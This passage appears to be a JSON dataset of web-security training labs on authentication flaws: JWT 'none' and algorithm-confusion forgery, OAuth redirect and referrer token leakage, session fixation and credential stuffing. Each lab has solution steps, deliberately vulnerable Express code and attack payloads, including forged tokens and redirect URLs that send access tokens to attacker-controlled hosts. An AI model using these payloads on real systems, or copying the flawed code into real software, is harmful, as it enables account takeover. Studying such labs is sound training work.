        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }, { username: 'user', password: 'user123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin-dashboard', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload?.payload?.role === 'admin') res.send('Welcome to admin dashboard'); else res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('JWT Lab running on http://localhost:3000'));",
        "payloads": [
          "{ \"alg\": \"none\" }.<payload with role=admin>.",
          "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leads to account takeover via third-party redirect",
        "Lab Description": "The application implements OAuth login but fails to validate the 'redirect_uri' and 'state' parameters. It is possible to manipulate the OAuth flow to bind an attacker-controlled third-party account to the victimâ€™s session. To solve: Trick the system into linking your OAuth identity to Carlos's account, then access his dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to intercept and explore the OAuth login flow initiated by the victim.",
          "2. Identify the request URL that contains the redirect_uri and state parameters.",
          "3. Modify the redirect_uri to point to your controlled OAuth identity and remove the state parameter entirely.",
          "4. Send the crafted link to the OAuth endpoint with Carlos's session token attached (stolen or guessed via browser cache/sniffing).",
          "5. After the system binds your OAuth identity to Carlosâ€™s account, access the victim dashboard directly."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = {}; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?code=xyz`); }); app.get('/callback', (req, res) => { const { code, user } = req.query;  users[user] = { oauthBound: true }; res.send(`OAuth bound to ${user}`); }); app.get('/dashboard', (req, res) => { const { user } = req.query; if (users[user]?.oauthBound) res.send(`Welcome ${user}, your OAuth is active.`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
        "payloads": [
          "https://target.com/auth?redirect_uri=https://attacker.com/callback&user=carlos",
          "https://target.com/callback?code=xyz&user=carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "The application uses predictable session IDs and does not invalidate the session token after login. This allows an attacker to set a session ID before victim login and later hijack the session. To solve: Fixate the session ID before Carlos logs in, then reuse that session ID to access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to initiate a login process without submitting credentials to obtain a session ID from the Set-Cookie header.",
          "2. Send a phishing link with the fixed session ID cookie to Carlos.",
          "3. Once Carlos logs in, intercept and reuse the same session ID.",
          "4. Replay the session using the cookie to access the /my-account endpoint.",
          "5. Confirm access by viewing Carlosâ€™s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username === 'carlos') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); app.listen(5000, () => console.log('Session Fixation Lab running on http://localhost:5000'));",
        "payloads": [
          "Set-Cookie: sid=12345; path=/",
          "Reuse sid=12345 after victim logs in",
          "Access /my-account with Cookie: sid=12345"
        ]
      },
      {
        "Lab scenario": "Session fixation via cookie injection in login workflow",
        "Lab Description": "The application does not invalidate user sessions upon authentication. Instead, it continues using any pre-authenticated session identifier, even if it was injected beforehand. The application uses cookie-based sessions without regeneration upon login. To solve: Hijack a session by fixing a session ID before victim login and access Carlos's account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Using Burp Suite, intercept a GET /login request and inject a crafted session cookie (e.g., sessionid=attacker1234). Forward the request.",
          "2.Share a phishing link with Carlos pointing to the login page. Carlos logs in while the sessionid=attacker1234 is already set.",
          "3.After Carlos logs in, the application does not regenerate the session ID and continues using the fixed value.",
          "4.Use the same session ID (attacker1234) in your browser and send a GET /my-account request.",
          "5.If successful, Carlosâ€™s authenticated session will be accessible using the fixed session ID."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { let sid = req.cookies.sessionid || 'guest'; res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><input type='hidden' name='sid' value='${sid}'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password, sid } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = username; res.cookie('sessionid', sid); res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Carlos account details'); res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab on port 3000'));",
        "payloads": [
          "sessionid=attacker1234",
          "Injected session cookie before login",
          "Phishing link with pre-set cookie"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm exploit in Authorization header",
        "Lab Description": "The backend uses JWT tokens for stateless authentication, but fails to enforce a valid algorithm for signature verification. If a token is submitted with the 'alg' field set to 'none', the backend accepts it without validating the signature. To solve: Forge a valid token for Carlos using the 'none' algorithm and access his protected resource.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Use Burp Suite or Postman to intercept a request with a valid JWT in the Authorization header.",
          "2.Decode the token using jwt.io or a custom script and extract the payload and header.",
          "3.Modify the header to set 'alg' to 'none' and set the payload to {\"username\": \"carlos\"}.",
          "4.Remove the signature part entirely and reconstruct the JWT as header.payload.",
          "5.Send the forged token in the Authorization header and access GET /account.",
          "6.Confirm successful bypass by verifying Carlosâ€™s account details are visible."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'topsecret'; app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') { return res.send('Carlos account accessed'); } else { return res.status(403).send('Access denied'); } } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Exploit Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [header].[payload].",
          "JWT with alg=none, no signature"
        ]
      },
      {
        "Lab scenario": "OAuth implicit grant token leakage via referrer",
        "Lab Description": "This lab implements OAuth 2.0 using the implicit grant flow. Access tokens are returned in the URL fragment, but a redirect leads to a third-party domain which leaks the token via the Referer header. To solve: Extract Carlosâ€™s access token from a leaked Referer and use it to access his data.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Use OWASP ZAP to passively scan and identify OAuth redirect flows in the login mechanism.",
          "2.Trigger an OAuth login using your own account and observe the redirection chain. Note where the access_token appears in the URL.",
          "3.Observe that after the redirect, the application sends the user to a third-party analytics subdomain, leaking the fragment in the Referer header.",
          "4.Set up a listener or check browser dev tools to capture the Referer header containing Carlosâ€™s token.",
          "5.Use the stolen token to craft an Authorization: Bearer header and send a request to GET /api/user-info.",
          "6.Verify access to Carlosâ€™s protected data using the token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { const html = `<script>location.href='https://analytics.lab.com/track?ref='+document.location.href</script>`; res.send(html); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') return res.send('Sensitive data for Carlos'); res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Token Leakage Lab running on port 3000'));",
        "payloads": [
          "https://oauth-provider.com/callback#access_token=carlos-access-token",
          "Referer: https://analytics.lab.com/track?ref=https://callback#access_token=carlos-access-token",
          "Authorization: Bearer carlos-access-token"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm exploit in session verification",
        "Lab Description": "The application uses JWTs to manage authenticated sessions, but it incorrectly allows tokens with the 'alg':'none' header to be accepted as valid. The application verifies tokens without validating the signature when 'none' is specified. To solve: forge a valid session token for the user 'admin' and access the admin dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept the login request using Burp Suite and inspect the JWT token returned in the Set-Cookie header.",
          "Copy the token to jwt.io and decode it. Observe the structure and headers. Notice the alg is set to HS256.",
          "Modify the JWT header to use 'alg':'none' and set the payload to {\"username\":\"admin\"}. Remove the signature part of the token.",
          "In Burp, replace the session cookie in a request to /admin with the modified unsigned JWT and send the request.",
          "If successful, the admin dashboard is displayed. Confirm by observing admin-only features or messages."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const secret = 'supersecret'; app.get('/login', (req, res) => { const token = jwt.sign({ username: 'user' }, secret); res.cookie('session', token); res.send('Logged in'); }); app.get('/admin', (req, res) => { try { const token = req.cookies.session; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT None Exploit Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "This application does not regenerate session cookies after login. An attacker can set a session ID before login and trick the victim into logging in with it, allowing session fixation. To solve: fixate Carlos's session and access their profile using the same session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Visit /login and inspect the cookie set before login. Note the 'session' cookie is issued pre-auth.",
          "Use a tool like Postman to set a session cookie manually before login.",
          "Send a crafted link to Carlos with the session cookie already injected via a custom header or Burp's proxy.",
          "After Carlos logs in, reuse the same session ID to access /profile.",
          "Verify successful access to Carlos's profile and account information."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.session || Math.random().toString(36); res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\" /></form>'); }); app.post('/login', (req, res) => { const username = req.query.username; const sid = req.cookies.session; sessions[sid] = username; res.send('Logged in'); }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Carlos profile data'); else res.send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "Set-Cookie: session=attackerSessionID;",
          "GET /login HTTP/1.1\\nCookie: session=attackerSessionID",
          "Manually inject session=attackerSessionID into Burpâ€™s cookie editor before victim logs in"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via referrer header in implicit flow",
        "Lab Description": "The app implements OAuth using the implicit grant type and returns access tokens in the URL fragment. Due to misconfigured redirects, tokens are leaked through the referrer header when loading external resources. To solve: capture an access token for the victim and use it to access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use a Burp Collaborator payload or webhook.site URL to craft an OAuth redirect_uri pointing to your domain.",
          "Send the link to the victim (Carlos) to simulate clicking an OAuth login.",
          "When Carlos logs in, observe that the access_token is returned in the URL fragment.",
          "Due to misconfiguration, a subsequent redirect or resource request includes this token in the Referrer header.",
          "Intercept the request to your server, extract the leaked token, and use it in a Bearer Authorization header to access Carlosâ€™s profile via the API."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token123-carlos' }; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token123-carlos') { res.send('Sensitive data for Carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000, () => console.log('OAuth Token Leak Lab running on port 5000'));",
        "payloads": [
          "https://vulnerable-app.com/auth?redirect_uri=https://webhook.site/your-custom-id",
          "GET /profile HTTP/1.1\\nAuthorization: Bearer token123-carlos",
          "Observe Referrer header leakage in requests from victim to external domains"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via alg=none in REST API login",
        "Lab Description": "The application uses JWTs to manage user sessions, but incorrectly allows the use of the 'none' algorithm. The `/api/login` endpoint accepts a username and password, returning a signed JWT. However, the server fails to validate the JWT signature properly when `alg` is set to `none`. The application treats the payload as valid without verifying the signature. To solve: forge a JWT that grants access to Carlosâ€™s account using the `alg=none` technique.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman or Burp Suite to log in as a regular user and capture the JWT from the `/api/login` response.",
          "Decode the JWT using jwt.io and inspect its header and payload to observe the `HS256` algorithm and user claim.",
          "Modify the JWT header to set `alg` to `none` and change the payload `username` claim to `carlos`.",
          "Remove the signature section entirely and base64 encode the new header and payload, joining them with a dot.",
          "Send the modified JWT as a bearer token to `/api/my-account` and verify if access to Carlosâ€™s data is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret' }, { username: 'wiener', password: 'p@ssword' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); const token = jwt.sign({ username: user.username }, 'supersecretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload?.header?.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.username === 'carlos') return res.send('Sensitive data for carlos'); } else { try { const verified = jwt.verify(token, 'supersecretkey'); if (verified.username === 'carlos') return res.send('Sensitive data for carlos'); } catch (e) { return res.status(403).send('Forbidden'); } } res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
          "header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access token via redirect",
        "Lab Description": "The application integrates a third-party OAuth provider for login using the `response_type=token` flow. However, it redirects the full access token to a third-party endpoint using an insecure redirect URI. This allows an attacker to intercept tokens by registering a malicious domain. To solve: craft a redirect URI pointing to a server you control and extract Carlosâ€™s access token upon login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Set up a request logger (e.g., requestbin, Burp Collaborator) to collect access token leaks.",
          "Inspect the OAuth login request and note the redirect_uri parameter vulnerability (no allowlist).",
          "Craft a malicious OAuth authorization URL with `redirect_uri` set to your logging endpoint and `response_type=token`.",
          "Send the URL to Carlos via phishing or social engineering to induce login via the vulnerable flow.",
          "Capture the access token from the request sent to your server and use it to access `/oauth/account` with an Authorization header."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token') { const token = Buffer.from('access-token-for-carlos').toString('base64'); return res.redirect(`${redirect_uri}#access_token=${token}`); } res.status(400).send('Invalid flow'); }); app.get('/oauth/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Buffer.from(token, 'base64').toString() === 'access-token-for-carlos') return res.send('OAuth Account Data: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "https://malicious.example.com#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M=",
          "https://attacker.site#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M=",
          "https://requestbin.net/#access_token=YWNjZXNzLXRva2VuLWZvci1jYXJsb3M="
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in GraphQL login",
        "Lab Description": "This application exposes a GraphQL endpoint for user authentication. Upon visiting the site, a fixed session cookie is assigned regardless of user identity. The server does not invalidate or regenerate the session after login, allowing a malicious user to predetermine a victim's session ID. To solve: predefine Carlosâ€™s session ID, get him to log in using it, then hijack the session and access his dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to analyze the session management behavior before and after login at `/graphql`.",
          "Notice that session cookies are not changed on successful login.",
          "Force the application to issue a fixed session ID (e.g., sessionid=attacker1234) by sending a crafted request as a guest.",
          "Convince Carlos to authenticate using the session cookie you created (e.g., via phishing link or XSS).",
          "Once logged in, reuse the session cookie to access `/graphql` as Carlos and extract account data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); let sessions = {}; app.post('/graphql', (req, res) => { const session = req.cookies.sessionid || 'guest-' + Math.random().toString(36).substr(2); res.cookie('sessionid', session); const query = req.body.query; if (query.includes('login')) { const { username, password } = JSON.parse(query.match(/\\{.*\\}/)[0]); if (username === 'carlos' && password === 'hunter2') { sessions[session] = 'carlos'; return res.send({ data: { login: true } }); } return res.send({ data: { login: false } }); } else if (query.includes('dashboard')) { if (sessions[session] === 'carlos') return res.send({ data: { account: 'carlos profile' } }); return res.status(403).send({ error: 'Not authenticated' }); } res.send({ data: {} }); }); app.listen(4000);",
        "payloads": [
          "Cookie: sessionid=attacker1234",
          "GraphQL login mutation with credentials: { login(username: \"carlos\", password: \"hunter2\") }",
          "GraphQL query with sessionid=attacker1234: { dashboard { account } }"
        ]
      },
      {
        "Lab scenario": "Session fixation in OAuth flow",
        "Lab Description": "The application uses OAuth for third-party login integration, but it fails to regenerate the session identifier after authentication. The application stores session tokens in cookies without proper rotation. To solve: Fixate your own session ID before login, then coerce the victim (Carlos) to authenticate via OAuth and capture their session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp Suite and intercept the login process via OAuth. Capture your session cookie before initiating authentication.",
          "Send the OAuth login initiation request to Burp Repeater. Note the session ID cookie (e.g., session=abc123).",
          "Craft a phishing link pointing to /auth/redirect with your fixated session cookie set. Trick Carlos into clicking it.",
          "Once Carlos completes the OAuth login flow, his session will be bound to your session ID.",
          "Use the captured session to access Carlos's /my-account page and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); app.get('/auth/redirect', (req, res) => { const user = { username: 'carlos' }; req.session.user = user; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account page for ${req.session.user.username}`); else res.status(403).send('Not authorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Phishing URL: /auth/redirect with session=abc123",
          "Cookie injection: session=abc123 before login",
          "OAuth flow replay using fixated session"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via algorithm confusion",
        "Lab Description": "This lab implements JWT-based authentication using the 'HS256' algorithm. However, the server fails to validate the token's algorithm field. To solve the lab, forge a JWT using the 'none' algorithm and access Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Log in with your own credentials and intercept the issued JWT using Burp.",
          "Decode the JWT at jwt.io and observe the algorithm field in the header.",
          "Replace the algorithm with 'none' and change the payload to { \"username\": \"carlos\" }.",
          "Remove the JWT signature completely.",
          "Replay the modified unsigned JWT to access the protected /my-account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('No token'); const payload = jwt.decode(token.replace('Bearer ', '')); req.user = payload; next(); }); app.get('/my-account', (req, res) => { if (req.user && req.user.username === 'carlos') res.send('Welcome to Carlos's account'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}",
          "Unsigned JWT token: base64(header).base64(payload).",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Multi-step credential stuffing with email discovery",
        "Lab Description": "This lab simulates a login form that leaks registered emails through the password reset feature. The login system does not implement account lockout, allowing credential stuffing attacks. To solve the lab, enumerate Carlos's email, then brute-force his password and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the POST /forgot endpoint. Submit various usernames and capture variations in the response (e.g., 200 OK vs 404).",
          "Confirm Carlos's email/username is valid by analyzing the response behavior.",
          "Send POST /login request to Burp Intruder. Add a position marker around the password field.",
          "Load a large password list and configure Intruder to use grep match for successful logins (e.g., 302 redirect).",
          "Once successful login credentials are found, access Carlos's /my-account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ email: 'carlos@example.com', password: 'dragon' }]; app.post('/forgot', (req, res) => { const { email } = req.body; const user = users.find(u => u.email === email); if (user) res.send('Reset link sent'); else res.status(404).send('User not found'); }); app.post('/login', (req, res) => { const { email, password } = req.body; const user = users.find(u => u.email === email && u.password === password); if (user) res.redirect('/my-account'); else res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { res.send('Carlos account page'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Credential Stuffing Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "POST /forgot with carlos@example.com",
          "Intruder password list: rockyou.txt",
          "Credential combo: carlos@example.com:dragon",
          "Grep match: 302 redirect or presence of 'My account'"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in stateless API",
        "Lab Description": "The stateless REST API uses JSON Web Tokens (JWTs) for authentication but fails to validate the 'alg' field correctly. The backend trusts the token header and doesn't enforce algorithm restrictions. The application decodes JWTs without verifying the signature if the algorithm is set to 'none'. To solve: Forge a valid admin token and access the /admin-dashboard endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to log in and intercept the Authorization: Bearer <JWT> header for a regular user.",
          "Copy the JWT and decode it using jwt.io to observe the 'alg' field and payload structure.",
          "Replace 'alg' value in header with 'none', and change payload role to 'admin'. Remove signature part.",
          "Send modified JWT using Postman with Authorization header to /admin-dashboard endpoint.",
          "Verify successful access by retrieving sensitive data from the admin panel."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }, { username: 'wiener', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Invalid user'); const token = jwt.sign({ username: user.username, role: user.role }, 'supersecret'); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.role === 'admin') { return res.send('Welcome to the admin panel'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via unregenerated session ID after login",
        "Lab Description": "This web application accepts a user-provided session ID via the Cookie header. Upon successful login, the server does not regenerate the session ID, enabling session fixation. To solve: Fixate Carlosâ€™s session ID before he logs in, then use that session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to proxy login and observe that session cookies are accepted from clients pre-auth.",
          "Craft a GET / request with Cookie: sessionId=fixed123 and confirm the same session persists after login.",
          "Convince Carlos to log in using a shared session (e.g., a phishing link or reflected XSS vector).",
          "Once Carlos logs in, reuse the fixed123 session ID to access /my-account.",
          "Validate success by retrieving account details of Carlos from /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecret' }]; let sessions = {}; app.get('/', (req, res) => { const sid = req.cookies.sessionId || 'guest'; res.cookie('sessionId', sid); res.send('Welcome guest'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionId; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username === 'carlos') res.send('Sensitive account info for Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: sessionId=fixed123",
          "POST /login with Cookie: sessionId=fixed123 and credentials for carlos",
          "GET /my-account with Cookie: sessionId=fixed123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access_token to referrer",
        "Lab Description": "This application uses OAuth for login with an external provider but fails to correctly isolate the access_token from insecure referrer leaks. When redirected after authentication, the token is included in the URL fragment which gets exposed in referrer headers. To solve: Harvest Carlos's OAuth token and use it to impersonate him via the API.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to initiate OAuth login and capture the redirect containing the token in the fragment.",
          "Host a malicious iframe endpoint and trick Carlos into clicking a link to the login page.",
          "Monitor the referrer header on your malicious domain to leak the OAuth access_token.",
          "Replay the stolen access_token using Postman to access GET /api/user-info.",
          "Confirm access by retrieving Carlos's personal data from the API."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': { data: 'Carlos personal data' } }; const tokens = { 'valid-token-carlos': 'carlos' }; app.get('/login/oauth-callback', (req, res) => { const token = req.query.token; res.redirect(`https://target-app.com/#access_token=${token}`); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const username = tokens[token]; if (username) { res.json({ user: username, data: users[username].data }); } else { res.status(403).json({ error: 'Invalid token' }); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running'));",
        "payloads": [
          "https://target-app.com/#access_token=valid-token-carlos",
          "GET /api/user-info with Authorization: Bearer valid-token-carlos",
          "<iframe src='https://target-app.com/login/oauth-callback?token=valid-token-carlos'></iframe>"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion attack in Authorization header",
        "Lab Description": "This lab uses JWTs for stateless session handling and verifies tokens in the Authorization header using the 'alg' field. The server trusts the algorithm declared in the JWT itself. The application uses asymmetric signing (RS256) but fails to enforce key verification. To solve: forge a valid JWT that grants admin privileges by exploiting the algorithm confusion.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in and capture the JWT issued in the Authorization header for a low-privileged user.",
          "In Burp Decoder, decode the JWT and observe the 'alg':'RS256' header and user role 'user'.",
          "Craft a new JWT header with 'alg':'HS256' and sign it using the public key as the HMAC secret.",
          "Change payload to set role:'admin'. Sign the modified token using HMAC with the public key as the key.",
          "Replace the original token in the Authorization header with the forged one and access /admin endpoint to confirm access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); const users = [{ username: 'user', password: 'userpass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('Token required'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') return res.send('Welcome Admin'); return res.status(403).send('Insufficient privileges'); } catch (err) { return res.status(400).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
